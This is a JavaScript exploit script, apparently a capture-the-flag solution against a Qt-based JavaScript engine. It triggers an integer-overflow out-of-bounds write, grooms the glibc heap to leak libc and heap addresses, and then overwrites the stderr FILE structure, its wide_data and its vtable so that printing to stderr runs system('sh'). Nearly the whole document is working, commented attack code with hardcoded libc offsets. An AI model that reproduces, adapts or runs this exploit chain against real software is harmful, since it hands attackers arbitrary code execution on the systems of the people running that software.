// libc dependent offsets

// Debug libc with symbols
//LIBC_OFFSET_main_arena = 0x000000000003e7c40
//LIBC_OFFSET_SYSTEM = 0x000000000004e9f0
//LIBC_OFFSET__IO_2_1_stderr = 0x00000000003e8680
//LIBC_OFFSET__IO_2_1_stdin = 0x00000000003e7a00
//LIBC_OFFSET__IO_wfile_jumps = 0x00000000003e3d60

// Current arch libc
LIBC_OFFSET_main_arena = 0x00000000001beaa0
LIBC_OFFSET__IO_2_1_stderr = 0x00000000001bf4e0
LIBC_OFFSET__IO_2_1_stdin = 0x00000000001be860
LIBC_OFFSET__IO_wfile_jumps = 0x00000000001babc0
LIBC_OFFSET_SYSTEM = 0x0000000000045380


// Derive other offsets from actual libc addresses
LIBC_OFFSET___IO_wide_data_0 = LIBC_OFFSET__IO_2_1_stdin+224
LIBC_OFFSET__IO_wide_data_2 = LIBC_OFFSET__IO_2_1_stdin-640
OFF_LEAK_TO_MAIN_ARENA = 1104

// Constants
FILE_VTABLE_OFFSET = 216
FILE_MODE_OFFSET = 192
FILE_FLAGS_OFFSET = 0
FILE_CODECVT_OFFSET = 152
FILE_CODECVT__codec_do_out_OFFSET = 0x8
// Make sure file's wide handlers are used during overflow handling
FILE_MODE = 1
// We don't use the flag symbols but keep them here for future reference
FILE_FLAG__IO_CURRENTLY_PUTTING = 0x800
FILE_FLAG__IONBUF = 0x2
FILE_FLAG = 0xfbad2884 // notably contains !_IONBUF && _IO_CURRENTLY_PUTTING


// Exploit tunables
s_bye = "Bye!\n"
to_be_freed_size = 0x100*4
to_be_freed_overhead = 0x30

trigger_gc = function(view, expected_vals){
    var x
    for(x=0;;++x){
        gc_holder[x] = ArrayBuffer(1);
        for(offset in expected_vals) {
            if(view[offset]!=expected_vals[offset]){
                return x;
            }
        }
    }
}

do_write = function(tar_high, tar_low, dword1, dword2){
    fake_offsets = calc_offset_dws(heap_high, heap_low, tar_high, tar_low)

    victim_view[10] = fake_offsets[1]
    victim_view[11] = fake_offsets[0]
    fully_controllable_view = new Uint32Array(fully_controllable_buf)

    fully_controllable_view[0] = dword1
    if(dword2 != undefined) {
        fully_controllable_view[1] = dword2
    }
}

calc_offset_dws = function (uint32_write_base_high, uint32_write_base_low, tar_high, tar_low) {
    // We assume libc base>heap base
    var high_dw = tar_high-uint32_write_base_high
    var low_dw = tar_low-uint32_write_base_low
    if(low_dw<0) {
        low_dw += 0x100000000;
        high_dw--;
    }
    return [high_dw, low_dw]
}

collect_leaks = function (view, chunk_startindex, searched_chunk_size) {
    // Make sure everything is initialized at its correct type to start with
    curr = chunk_startindex, done=false, prev_inuse=false, curr_inuse=false;
    curr_size = view[0], aligned_size = view[0], off_next_chunk=view[0];
    found_chunk_offset = view[0], off_to_next = view[0];
    libc_high_addr = view[0], libc_low_addr=view[0];
    heap_high_addr = view[0], heap_low_addr=view[0];
    curr_checked_fd = view[0], curr_checked_bk=view[0];
    fd_low = view[0], fd_high = view[0];
    bk_low = view[0], bk_high = view[0];
    fd_nextsize_low = view[0], bk_nextsize_low = view[0]
    fd_nextsize_high = view[0], bk_nextsize_high = view[0]
    diff = 0;

    // To debug the acceses, use break UInt32ArrayRead and dump the arguments (data, index, *((int *)(data+index)))
    while(!done) {
        curr_size = view[curr+2];
        if(curr_size >= 0x10000) {
            return -1;
        }
        prev_inuse = curr_size & 1 == 1;
        aligned_size = ((curr_size-curr_size%8))
        off_next_chunk = curr+aligned_size/4
        if(aligned_size != searched_chunk_size) {
            // too small, go to next one
            curr = off_next_chunk
            continue
        }
        // We have a larger chunk. Let's see if its inuse

        curr_inuse = view[off_next_chunk+2]&1 == 1
        if(curr_inuse){
            curr = off_next_chunk
            continue
        }

        // We found a free chunk of correct size, check pointers
        // We look for a chunk that has close pointers
        fd_low = view[curr+4]
        fd_high = view[curr+5]
        bk_low = view[curr+6]
        bk_high = view[curr+7]

        // Our setup is:
        // 1. exhaust the heap
        // 2. allocate buffers of large bin sizes without references
        // 3. trigger GC with small allocations
        // 4. allocate even larger large bin entry
        // This means first our large bin entries got freed -> unsorted bin
        // Now another, bigger allocation was triggered -> sorting smaller large bin entries into large bin
        // The first chunk we allocated now is the front chunk of the large bin
            // -> chunk->bk points at large bin in libc
            // -> also (not 100% sure why) the entry is the only entry in the next_size linked list so points to itself
        // This check looks for exactly this chunk in particular giving us both leaks at once 
        fd_nextsize_low = view[curr+8]
        fd_nextsize_high = view[curr+9]
        bk_nextsize_low = view[curr+10]
        bk_nextsize_high = view[curr+11]
        if(fd_nextsize_high != 0 && fd_nextsize_low==bk_nextsize_low && fd_nextsize_high==bk_nextsize_high) {
            // found self address by self-linked list of large chunks
            //console.log()

            // Now look if we are at the start of a bin (bk is set to libc address)
            //if(bk_high & 0xffffff00 == 0x7f00 ) {
                // Looks much like a libc address. Return both
                return [bk_high, bk_low, fd_nextsize_high, fd_nextsize_low-4*curr]
            //}
        }

        // This is code we could use for a more generic approach by moving back and forth the heap
        // and deriving actual addresses that way
        /*
        if(fd_high==bk_high) {
            if(fd_low>bk_low) {
                diff = fd_low-bk_low
            } else {
                diff = bk_low-fd_low
            }
            if(diff<=8*searched_chunk_size) {
                // We seem to have found adjacent
                return curr
            }
        }*/

        curr = off_next_chunk
    }
}

// Rooted objects to keep heap state more predictable
gc_holder = Array(0x1000)
delete_guards = Array(0x1000)
victim = undefined;
victim_view = undefined;
victim_view_32 = undefined;
// Create this so throwing the error does not result in more allocations
err = new Error()

heap_norm_buffer_views = Array((1024/8)*32)
heap_norm_buffers = Array((1024/8)*32)
heap_norm_small = Array(0x200);

refcount = 12;
size_low_word = 0
size_high_word = 0xffff

// Create an Array with size 0x100000000//2 to cause an integer overflow
ary = new Array(0x80000000);

{ console.log("start"); }

// set up first member of array that will allocate an object during value retrieval
// as the heap is clean upon invocation, we can force the ArrayBuffer directly behind
// the oob array
allocating_value = {valueOf: function(){
    victim=new ArrayBuffer(7);
    victim_view=new Uint8Array(victim);
    for(g=0;g<victim.byteLength;++g) {
        victim_view[g]=0x66;
    }
    return 0x4444;
}};
// Call the function once to get it interpreted as byte code (which causes an allocation)
// which we want to avoid later
allocating_value.valueOf();

ary[0] = allocating_value;
for(i = 1; i < 8; i++){ary[i] = 0x4444;}
ary[8] = 0x31; // next_chunk.size
ary[9] = 0;
ary[10] = 0;
ary[11] = 0;

ary[12] = refcount; // QArrayData.refcount
ary[13] = 0;
ary[14] = size_low_word; // QArrayData.size
ary[15] = size_high_word;
ary[16] = size_low_word; // QArryData.alloc
ary[17] = size_high_word;
ary[18] = 1;  // QArrayData.capacityReserverd
ary[19] = 0;
ary[20] = 0x18;  // QArrayData.offset
ary[21] = 0;
ary[22] = 0;
ary[23] = 0;

ary[24] = {valueOf: function() {throw err}};

try {
    holder = new Array(0x400);

    // normalize heap
    // before attempting overwrite
    for(g=0;g<1024;g+=8) {
        // General sizes
        for(j=0;j<32;++j) {
            heap_norm_buffers[g*32+j] = new ArrayBuffer(g);
            heap_norm_buffer_views[g*32+j] = new Uint8Array(heap_norm_buffers[g*32+j]);
            heap_norm_buffer_views[g*32+j][0] = 0x43;
        }

        // Also we seem to need some small allocations to exhaust leftover chunks
        holder[g] = new Int8Array(new ArrayBuffer(8));
        if(!(g % 2)) { heap_norm_small[g/2] = new Int8Array(new ArrayBuffer(8))}
    }

    // trigger oob write
    Int16Array(ary);
}
catch(e){}

var victim_view = Uint32Array(victim);

// We set up a buffer just after our victim view to create another,
// repeatedly controllable object
var fully_controllable_buf = new ArrayBuffer(8);
//var fully_controllable_view = new DataView(fully_controllable_buf)
//fully_controllable_view.setUint32(0, 0xBBBBBBBB)
//fully_controllable_view.setUint32(1, 0xAAAAAAAA)
{
    // Allocate a bunch of chunks as well as guards in between them to get links placed
    for(i=0;i<10;++i) {
        var tmp = Uint8Array(to_be_freed_size);
        delete_guards[i] = Uint8Array(to_be_freed_size);
        for(j=0;j<tmp.byteLength;++j) {
            tmp[j] = 0x41;
            delete_guards[i][j] = 0x42;
        }
    }
}



// Search for our buffer that is about to be freed by garbage collection
for(j=0;;++j) {
    if(victim_view[j]==0x41414141 &&
        victim_view[j+1]==0x41414141 &&
        victim_view[j+2]==0x41414141) {
            break
        }
}

// Create an object containing the current state of the free'd object
// This allows trigger_gc to notice when garbage collection has run
// after one of the small buffer allocations
expected = {}
expected[j-1]=0
expected[j-2]=0x18
expected[j-3]=0
expected[j-4]=to_be_freed_size+1
trigger_gc(victim_view, expected)

// Allocate a huge buffer that will put the other large buffers into their large bins
z = Uint8Array(8*to_be_freed_size+0x100)

// For break UInt32ArrayWrite
victim_view[0] = 0x90909090

// We are passing the offset of 2 as 2*4=8 is the amount of space that was
// left up to the next chunk's prev_size field
// Also the size we are looking for in memory has to take into account the ArrayData metadata
leak = collect_leaks(victim_view, 2, to_be_freed_size+to_be_freed_overhead)
libc_high = leak[0]
libc_low = leak[1]
libc_low -= OFF_LEAK_TO_MAIN_ARENA
libc_low -= LIBC_OFFSET_main_arena
heap_high = leak[2]
heap_low = leak[3]+0x18

{
    console.log("Got leaks\n")
    console.log("Libc: 0x" + libc_high.toString(16)+libc_low.toString(16) + "\n")
    console.log("Heap: 0x" + heap_high.toString(16)+heap_low.toString(16) + "\n")
}

try {
    // Set up fake flags and mode first
    do_write(libc_high, libc_low+LIBC_OFFSET__IO_2_1_stderr+FILE_FLAGS_OFFSET, FILE_FLAG, undefined)
    do_write(libc_high, libc_low+LIBC_OFFSET__IO_2_1_stderr+FILE_MODE_OFFSET, 1, undefined)

    // Fake codecvt directly where wide_data is (_wide_data is already pre-set which we are going to use)
    do_write(libc_high, libc_low+LIBC_OFFSET__IO_2_1_stderr+FILE_CODECVT_OFFSET, libc_low+LIBC_OFFSET__IO_wide_data_2, libc_high)

    // Set up codecvt function and ";sh#" string
    // XXX: Need to make sure those values are not overwritten during file operations
    do_write(libc_high, libc_low+LIBC_OFFSET__IO_wide_data_2, 0x00006873, 0)
    do_write(libc_high, libc_low+LIBC_OFFSET__IO_wide_data_2+FILE_CODECVT__codec_do_out_OFFSET, libc_low+LIBC_OFFSET_SYSTEM, libc_high)

    // Now set up pointers inside _IO_2_1_stderr_->file->_wide_data
    // As a static data buffer, we just abuse the unused _IO_2_1_stdin_->file->_wide_data space
    //set _IO_2_1_stderr_->file->_wide_data->_IO_write_base=$_dummy_data
    do_write(libc_high, libc_low+LIBC_OFFSET__IO_wide_data_2+32, libc_low+LIBC_OFFSET___IO_wide_data_0, libc_high)

    //set _IO_2_1_stderr_->file->_wide_data->_IO_write_ptr=$_dummy_data+0x10
    do_write(libc_high, libc_low+LIBC_OFFSET__IO_wide_data_2+40, libc_low+LIBC_OFFSET___IO_wide_data_0+0x10, libc_high)

    //set _IO_2_1_stderr_->file->_wide_data->_IO_write_end=$_dummy_data+0x20
    do_write(libc_high, libc_low+LIBC_OFFSET__IO_wide_data_2+48, libc_low+LIBC_OFFSET___IO_wide_data_0+0x20, libc_high)

    //set _IO_2_1_stderr_->file->_wide_data->_IO_buf_base=$_dummy_data
    do_write(libc_high, libc_low+LIBC_OFFSET__IO_wide_data_2+56, libc_low+LIBC_OFFSET___IO_wide_data_0, libc_high)

    //set _IO_2_1_stderr_->file->_wide_data->_IO_buf_end=$_dummy_data+0x20
    do_write(libc_high, libc_low+LIBC_OFFSET__IO_wide_data_2+64, libc_low+LIBC_OFFSET___IO_wide_data_0+0x20, libc_high)

    // Set new wide_data vtable
    do_write(libc_high, libc_low+LIBC_OFFSET__IO_2_1_stderr+FILE_VTABLE_OFFSET, libc_low+LIBC_OFFSET__IO_wfile_jumps, libc_high)

    // Trigger stderr write for code exec
    console.log(s_bye)
} catch(e) {console.log(e)}
